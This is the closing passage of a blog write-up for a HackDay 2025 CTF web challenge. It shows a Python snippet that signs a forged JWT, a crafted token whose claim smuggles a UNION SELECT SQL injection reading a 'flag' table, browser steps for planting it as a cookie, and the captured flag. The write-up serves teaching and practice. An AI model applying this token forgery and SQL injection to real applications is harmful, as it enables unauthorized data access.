</span>	<span class="n">jwt_secret_key</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
    <span class="n">jwt</span> <span class="o">=</span> <span class="nf">sign_jwt</span><span class="p">(</span><span class="n">jwt_secret_key</span><span class="p">)</span>
	
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Generated JWT key:</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">jwt_secret_key</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Generated JWT token:</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">jwt</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s run it:
<a href="/assets/img/writeups/YourRegionsFinest/jwt_creation.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/jwt_creation.png" alt="index"  loading="lazy"></a>
<em>We’ve generated a signed JWT !</em></p>

<div file="crafted_jwt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="crafted_jwt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDMyOSwianRpIjoiMGZhMGRjNjgtMDU2Mi00YWMyLTg5NzEtZDA1Mzg1NmRmNGFiIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3Mzc5MzQyMjksImV4cCI6MTczNzkzNjMyOSwiZmF2b3JpdGVfcHJvZHVjdCI6IjQgVU5JT04gU0VMRUNUIG51bGwsIG51bGwsbnVsbCxmbGFnLG51bGwsbnVsbCBGUk9NIGZsYWc7In0._rU1aPd0-okBSdCoamyqW9pntOma_nx7nt4E4onLBEY
</pre></td></tr></tbody></table></code></div></div>

<h3 id="getting-flag"><span class="me-2">Getting flag</span><a href="#getting-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Finally, we can use this cookie to get the flag.</p>

<p>To do so: <code class="language-plaintext highlighter-rouge">right-click, inspect -&gt; storage</code>. Paste the Generated JWT in here, then go to <code class="language-plaintext highlighter-rouge">/favorite_product_info</code> <em>(the SQLi vulnerable endpoint)</em>:
<a href="/assets/img/writeups/YourRegionsFinest/okay.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/okay.png" alt="index"  loading="lazy"></a></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>HACKDAY{Th4t_s_S0m3_g000000000000d_qu4lity!}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/writeups/">Writeups</a>,
          <a href="/categories/ctftime2025/">CTFTime2025</a>,
          <a href="/categories/hackday/">HackDay</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeups/"
            class="post-tag no-text-decoration"
          >writeups</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/jwt/"
            class="post-tag no-text-decoration"
          >jwt</a>
        
          <a
            href="/tags/flask/"
            class="post-tag no-text-decoration"
          >flask</a>
        
          <a
            href="/tags/python-scripting/"
            class="post-tag no-text-decoration"
          >python-scripting</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HackDay%20-%20Finest%20-%20NullBrunk&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-finest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HackDay%20-%20Finest%20-%20NullBrunk&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-finest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-finest%2F&text=HackDay%20-%20Finest%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

         
            <!-- panel -->
            <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
              <div class="access">
                

  <section id="toc-wrapper">
    <h2 class="panel-heading no-border">Event</h2>
    <ul class="content list-unstyled no-border ps-0 pb-1 ms-1 mt-2 toc-list ">
    
      <li class="toc-list-item">
        <a class="toc-link node-name--H2 img-link fw-600 blue-sidebar"> <i class="fa-solid fa-ranking-star mr-11-px"></i> 40 / 150  </a>
      </li>

      <li class="toc-list-item no-border">
        <a class="toc-link node-name--H2 img-link fw-600" href="https://ctftime.org/event/2615" target="_blank"> <i class="fa-solid fa-link mr-11-px"></i>Link</a>
      </li>

    </ul>
  </section>





                

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/jwt/">jwt</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/flask/">flask</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/python-scripting/">python-scripting</a>
          
        </div>
      </nav>
  </section>


              </div>

              
                
                






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-1 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>

              
            </aside>
          
        </div>

        <div class="row">
          <!-- tail -->

          
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/pragyan-deathdaycard/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739030400"
  data-df="ll"
  
>
  Feb  8, 2025
</time>

              <h4 class="pt-0 my-2">Pragyan - Deathday Card</h4>
              <div class="text-muted">
                <p>Introduction
    
      Pragyan CTF 2025
      Description
    
  
  Enumeration
    
      Reading Source Code
      Identifying vulnerabilities
    
  
  Exploitation
    
      Verifying SSTI
  ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/hackday-2025-website-checker/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737892800"
  data-df="ll"
  
>
  Jan 26, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Verificator 3000</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Enumerating website
    
  
  Exploitation
    
      SSRF
        
          Trying to access localhost
          Exploiting Op...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/hackday-2025-internalblog/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737892800"
  data-df="ll"
  
>
  Jan 26, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Internal Blog</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Enumerating website
    
  
  Exploitation
    
      Popping alert
      Stealing Admin Cookie
      Getting flag
    
  




I...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/poc/">poc</a>
          
        </div>
      </nav>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

